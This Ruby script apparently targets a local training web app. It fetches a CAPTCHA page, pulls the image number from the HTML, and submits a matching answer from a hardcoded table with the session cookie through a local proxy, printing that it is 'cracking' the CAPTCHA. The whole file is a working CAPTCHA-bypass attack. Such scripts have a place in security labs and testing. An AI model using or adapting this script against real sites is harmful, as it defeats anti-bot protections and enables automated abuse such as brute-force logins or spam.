require "net/http"
require "uri"

PROXY = "127.0.0.1"
PROXY_PORT = "8080"

def attack(theImage,cookie)
uri = URI.parse('http://127.0.0.1/captcha/validate.php')
	req = Net::HTTP::Post.new(uri.path)
	req.add_field("Cookie", cookie)
	puts theImage
	if theImage=='0'
	ans = 1987
	elsif theImage=='1'
	ans = 9259
	elsif theImage=='2'
	ans = 5803
	elsif theImage=='3'
	ans = 7026
	elsif theImage=='4'
	ans = 6859
	elsif theImage=='5'
	ans = 2224
	elsif theImage=='6'
	ans = 8196
	elsif theImage=='7'
	ans = 9927
	elsif theImage=='8'
	ans = 6612
	else theImage=='9'
	ans = 7342
	end
	req.body = "captcha=#{ans}&submit=Submit"
	#The HTTP request is being made
	res = Net::HTTP::Proxy(PROXY, PROXY_PORT).start(uri.host, uri.port) do |http| 
	http.request(req)
	end
	puts "We are making the HTTP request to crack the CAPTCHA...."
	puts "-------------------------------------------------------"
	puts req.body
	puts "-------------------------------------------------------"
	puts "The response is...."
	puts "-------------------------------------------------------"
	puts res.body.to_s
	puts "-------------------------------------------------------"
end


uri = URI.parse('http://127.0.0.1/captcha/captcha2.php')

	Net::HTTP.start(uri.host, uri.port) do |http|
	  request = Net::HTTP::Get.new uri
	  response = http.request request 
	  token = response.body
	  cookie = response['Set-Cookie']
	  puts "We are making the request to get image..."
	  token = token.split(/src='/)
	  token = token.to_s
	  token = token.split(/.png/)
	  token = token.to_s
	  token = token.split(/"/)
	  theImage =  token[4]
	  puts "The image number obtained is: #{theImage}"
	  attack(theImage,cookie)  
	end
	